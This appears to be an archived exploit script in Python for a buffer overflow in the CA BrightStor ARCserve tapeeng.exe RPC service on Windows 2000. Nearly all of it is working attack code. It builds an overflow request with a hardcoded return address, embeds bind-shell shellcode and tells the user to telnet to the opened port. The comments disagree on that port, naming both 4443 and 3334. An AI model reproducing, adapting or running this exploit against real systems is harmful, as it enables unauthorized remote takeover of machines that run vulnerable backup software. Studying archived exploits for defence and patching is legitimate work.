#!/usr/bin/python
# Remote exploit for buffer overflow vulnerability in CA BrightStor Arcserve
# tapeeng.exe service. Tested on windows 2000 SP4. Binds shell to TCP port 4443
#
# Winny M Thomas ;-)
# Author shall bear no responsibility for any screw ups caused by using this code


from impacket.dcerpc import transport, dcerpc
from impacket import uuid
import sys

def EnableDetailLogging(target):
       trans = transport.TCPTransport(target, 6502)
       #On some linux systems the following call to connect may fail due to
       #no support of settimeout in socket module. Comment out that line in
       #transport.py of impacket and run this script

       try:
               trans.connect()
       except:
               print 'Could not connect to target port; Target may not be running tapeeng'
               sys.exit(-1)

       dce = dcerpc.DCERPC_v5(trans)
       dce.bind(uuid.uuidtup_to_bin(('62b93df0-8b02-11ce-876c-00805f842837','1.0')))

       #RPC request to enable detail logging
       request = '\x00\x04\x08\x0c'
       request += '\x02\x00\x00\x00'
       request += '\x00\x00\x00\x00'
       request += '\x00\x00\x00\x00'
       request += '\x00\x00\x00\x00'

       dce.call(43, request)

def DCEconnectAndExploit(target):
       trans = transport.TCPTransport(target, 6502)
       trans.connect()
       dce = dcerpc.DCERPC_v5(trans)
       dce.bind(uuid.uuidtup_to_bin(('62b93df0-8b02-11ce-876c-00805f842837','1.0')))

       request  = '\x10\x09\xf9\x77'
       request += '\x41'*1130
       request += '\x90\x90\x90\x90\xeb\x08' #short jump into nops
       request += '\xd2\x7b\x57\x7c' #call ebx address from kernel32.dll
       request += '\x90' * 32
       #Shellcode to bind shell to TCP port 3334
       request += "\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
       request += "\x13\xe9\x59\x23\xce\x83\xeb\xfc\xe2\xf4\x15\x33\xc8\x83"
       request += "\x01\xa0\xdc\x31\x16\x39\xa8\xa2\xcd\x7d\xa8\x8b\xd5\xd2"
       request += "\x5f\xcb\x91\x58\xcc\x45\xa6\x41\xa8\x91\xc9\x58\xc8\x87"
       request += "\x62\x6d\xa8\xcf\x07\x68\xe3\x57\x45\xdd\xe3\xba\xee\x98"
       request += "\xe9\xc3\xe8\x9b\xc8\x3a\xd2\x0d\x07\xe6\x9c\xbc\xa8\x91"
       request += "\xcd\x58\xc8\xa8\x62\x55\x68\x45\xb6\x45\x22\x25\xea\x75"
       request += "\xa8\x47\x85\x7d\x3f\xaf\x2a\x68\xf8\xaa\x62\x1a\x13\x45"
       request += "\xa9\x55\xa8\xbe\xf5\xf4\xa8\x8e\xe1\x07\x4b\x40\xa7\x57"
       request += "\xcf\x9e\x16\x8f\x45\x9d\x8f\x31\x10\xfc\x81\x2e\x50\xfc"
       request += "\xb6\x0d\xdc\x1e\x81\x92\xce\x32\xd2\x09\xdc\x18\xb6\xd0"
       request += "\xc6\xa8\x68\xb4\x2b\xcc\xbc\x33\x21\x31\x39\x31\xfa\xc7"
       request += "\x1c\xf4\x74\x31\x3f\x0a\x70\x9d\xba\x0a\x60\x9d\xaa\x0a"
       request += "\xdc\x1e\x8f\x31\x32\x95\x8f\x0a\xaa\x2f\x7c\x31\x87\xd4"
       request += "\x99\x9e\x74\x31\x3f\x33\x33\x9f\xbc\xa6\xf3\xa6\x4d\xf4"
       request += "\x0d\x27\xbe\xa6\xf5\x9d\xbc\xa6\xf3\xa6\x0c\x10\xa5\x87"
       request += "\xbe\xa6\xf5\x9e\xbd\x0d\x76\x31\x39\xca\x4b\x29\x90\x9f"
       request += "\x5a\x99\x16\x8f\x76\x31\x39\x3f\x49\xaa\x8f\x31\x40\xa3"
       request += "\x60\xbc\x49\x9e\xb0\x70\xef\x47\x0e\x33\x67\x47\x0b\x68"
       request += "\xe3\x3d\x43\xa7\x61\xe3\x17\x1b\x0f\x5d\x64\x23\x1b\x65"
       request += "\x42\xf2\x4b\xbc\x17\xea\x35\x31\x9c\x1d\xdc\x18\xb2\x0e"
       request += "\x71\x9f\xb8\x08\x49\xcf\xb8\x08\x76\x9f\x16\x89\x4b\x63"
       request += "\x30\x5c\xed\x9d\x16\x8f\x49\x31\x16\x6e\xdc\x1e\x62\x0e"
       request += "\xdf\x4d\x2d\x3d\xdc\x18\xbb\xa6\xf3\xa6\x19\xd3\x27\x91"
       request += "\xba\xa6\xf5\x31\x39\x59\x23\xce"

       dce.call(38, request)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target ip>\n' % sys.argv[0]
               sys.exit(-1)

       EnableDetailLogging(target)
       DCEconnectAndExploit(target)

       print 'Exploit complete; Now telnet to port 4443 on target'

# milw0rm.com [2007-01-05]
